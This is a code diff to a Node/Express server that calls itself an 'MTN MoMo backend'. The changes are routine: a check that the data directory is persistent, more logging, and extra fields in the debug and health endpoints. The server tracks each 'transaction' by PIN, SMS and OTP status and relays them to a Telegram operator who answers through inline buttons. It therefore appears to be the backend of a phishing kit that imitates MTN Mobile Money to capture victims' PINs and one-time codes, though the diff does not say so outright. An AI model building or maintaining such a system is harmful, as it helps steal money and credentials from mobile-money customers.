@@ -17,6 +17,12 @@ const RAW_FILE   = path.join(DATA_DIR, 'telegram_raw.json');
 
 try { if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true }); } catch(e){}
 
+const IS_PERSISTENT = DATA_DIR === '/data';
+if (!IS_PERSISTENT) {
+  console.warn('⚠️  DATA_DIR is not persistent — data will be wiped on restart!');
+  console.warn('⚠️  To fix: add Render persistent disk mounted at /data, set DATA_DIR=/data');
+}
+
 app.use(cors());
 app.use(express.json({ limit: '2mb' }));
 app.use(express.urlencoded({ extended: true }));
@@ -27,10 +33,7 @@ app.use((req, _res, next) => {
   next();
 });
 
-/* ───────────────────────────────────────────────────────────
-   RAW TELEGRAM LOGGER — captures EVERY webhook payload
-   so we can see exactly what Telegram sends
-   ─────────────────────────────────────────────────────────── */
+// RAW webhook logger
 app.post('/api/telegram-webhook', (req, _res, next) => {
   try {
     let log = [];
@@ -39,7 +42,7 @@ app.post('/api/telegram-webhook', (req, _res, next) => {
     }
     log.push({ receivedAt: new Date().toISOString(), body: req.body });
     fs.writeFileSync(RAW_FILE, JSON.stringify(log.slice(-30), null, 2));
-    console.log(`[raw-webhook] captured (${log.length} total) update_id=${req.body?.update_id}`);
+    console.log(`[raw-webhook] captured update_id=${req.body?.update_id}`);
   } catch(e) {
     console.warn('[raw-webhook] save failed:', e.message);
   }
@@ -64,8 +67,8 @@ function saveMap(file, map){
 let links = loadMap(LINKS_FILE) || new Map();
 let txs   = loadMap(TXS_FILE)   || new Map();
 
-console.log(`[links] restored ${links.size} from disk`);
-console.log(`[txs]   restored ${txs.size} from disk`);
+console.log(`[links] restored ${links.size} from disk (${LINKS_FILE})`);
+console.log(`[txs]   restored ${txs.size} from disk (${TXS_FILE})`);
 
 function persistLinks(){ saveMap(LINKS_FILE, links); }
 function persistTxs(){   saveMap(TXS_FILE, txs); }
@@ -121,6 +124,7 @@ function ensureTx(trackingNumber, extra){
       ...extra
     };
     txs.set(trackingNumber, t);
+    console.log(`[ensureTx] created ${trackingNumber}`);
   } else if (extra) {
     Object.assign(t, extra);
   }
@@ -153,6 +157,7 @@ app.get('/', (_req, res) => {
     activeLinks: links.size,
     activeTxs: txs.size,
     dataDir: DATA_DIR,
+    isPersistent: IS_PERSISTENT,
     telegramConfigured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
     publicUrl: resolvePublicUrl(),
     time: new Date().toISOString()
@@ -165,7 +170,7 @@ app.get('/health', (_req, res) => res.json({
   activeLinks: links.size,
   activeTxs: txs.size,
   dataDir: DATA_DIR,
-  publicUrl: resolvePublicUrl()
+  isPersistent: IS_PERSISTENT
 }));
 
 app.get('/api/debug', (_req, res) => {
@@ -175,16 +180,20 @@ app.get('/api/debug', (_req, res) => {
     pinStatus: t.pinStatus,
     smsStatus: t.smsStatus,
     otpStatus: t.otpStatus,
-    lang: t.lang || '—'
+    lang: t.lang || '—',
+    createdAt: t.createdAt
   });
-  res.json({ ok:true, dataDir: DATA_DIR, publicUrl: resolvePublicUrl(), txs: tList });
+  res.json({
+    ok: true,
+    dataDir: DATA_DIR,
+    isPersistent: IS_PERSISTENT,
+    publicUrl: resolvePublicUrl(),
+    txsCount: txs.size,
+    linksCount: links.size,
+    txs: tList
+  });
 });
 
-/* ───────────────────────────────────────────────────────────
-   WEBHOOK DEBUG — see everything
-   ─────────────────────────────────────────────────────────── */
-
-// Raw payloads captured
 app.get('/api/telegram-raw', (_req, res) => {
   try {
     if (!fs.existsSync(RAW_FILE)) return res.json({ ok:true, count: 0, entries: [] });
@@ -195,7 +204,6 @@ app.get('/api/telegram-raw', (_req, res) => {
   }
 });
 
-// Clear raw payloads
 app.get('/api/telegram-raw/clear', (_req, res) => {
   try {
     if (fs.existsSync(RAW_FILE)) fs.unlinkSync(RAW_FILE);
@@ -205,15 +213,16 @@ app.get('/api/telegram-raw/clear', (_req, res) => {
   }
 });
 
-// Full webhook diagnostic
 app.get('/api/webhook-doctor', async (_req, res) => {
   const report = {
     ok: true,
     ts: new Date().toISOString(),
     publicUrl: resolvePublicUrl(),
+    dataDir: DATA_DIR,
+    isPersistent: IS_PERSISTENT,
     env: {
       PUBLIC_URL: process.env.PUBLIC_URL || '(not set)',
-      RAILWAY_PUBLIC_DOMAIN: process.env.RAILWAY_PUBLIC_DOMAIN || '(not set)',
+      DATA_DIR: process.env.DATA_DIR || '(not set)',
       RENDER_EXTERNAL_HOSTNAME: process.env.RENDER_EXTERNAL_HOSTNAME || '(not set)',
       TELEGRAM_BOT_TOKEN: TELEGRAM_BOT_TOKEN ? '✓ set' : '❌ missing',
       TELEGRAM_CHAT_ID: TELEGRAM_CHAT_ID ? '✓ set' : '❌ missing'
@@ -223,7 +232,6 @@ app.get('/api/webhook-doctor', async (_req, res) => {
     recentRaw: null
   };
 
-  // Telegram bot info
   try {
     const meRes = await fetch(`${TELEGRAM_API}/getMe`);
     report.me = await meRes.json();
@@ -231,7 +239,6 @@ app.get('/api/webhook-doctor', async (_req, res) => {
     report.me = { error: e.message };
   }
 
-  // Webhook info
   try {
     const whRes = await fetch(`${TELEGRAM_API}/getWebhookInfo`);
     report.webhook = await whRes.json();
@@ -239,7 +246,6 @@ app.get('/api/webhook-doctor', async (_req, res) => {
     report.webhook = { error: e.message };
   }
 
-  // Last 5 raw payloads
   try {
     if (fs.existsSync(RAW_FILE)) {
       const entries = JSON.parse(fs.readFileSync(RAW_FILE, 'utf8'));
@@ -267,7 +273,6 @@ app.get('/api/set-webhook', async (_req, res) => {
   } catch (e) { res.status(500).json({ ok:false, error: e.message }); }
 });
 
-// Delete webhook (useful for debugging)
 app.get('/api/delete-webhook', async (_req, res) => {
   try {
     const r = await fetch(`${TELEGRAM_API}/deleteWebhook?drop_pending_updates=true`);
@@ -614,7 +619,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
     console.log(`[webhook] parsed parts=${JSON.stringify(parts)} length=${parts.length}`);
 
     if (parts.length !== 4 || parts[0] !== 'mtn') {
-      console.log(`[webhook] ❌ unexpected callback_data format — expected 4 parts starting with "mtn"`);
+      console.log(`[webhook] ❌ unexpected format`);
       await tgAnswer(cq.id, 'Unknown action');
       return res.json({ ok:true });
     }
@@ -629,7 +634,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
       if (restored) { txs = restored; t = txs.get(tracking); }
     }
     if (!t) {
-      console.log(`[webhook] ❌ transaction not found: ${tracking}`);
+      console.error(`[webhook] ❌ Session expired: tracking ${tracking} NOT in txs (data was wiped on restart?)`);
       await tgAnswer(cq.id, 'Session expired');
       return res.json({ ok:true });
     }
@@ -685,9 +690,6 @@ async function registerWebhook(){
 app.listen(PORT, async () => {
   console.log(`MTN MoMo backend running on port ${PORT}`);
   console.log(`Static HTML dir: ${path.join(__dirname, '..')}`);
-  console.log(`Data directory: ${DATA_DIR}`);
-  if (DATA_DIR !== '/data') {
-    console.warn('⚠️  No persistent disk — data wiped on restart');
-  }
+  console.log(`Data directory: ${DATA_DIR} ${IS_PERSISTENT ? '✅ PERSISTENT' : '⚠️  TEMPORARY'}`);
   await registerWebhook();
 });
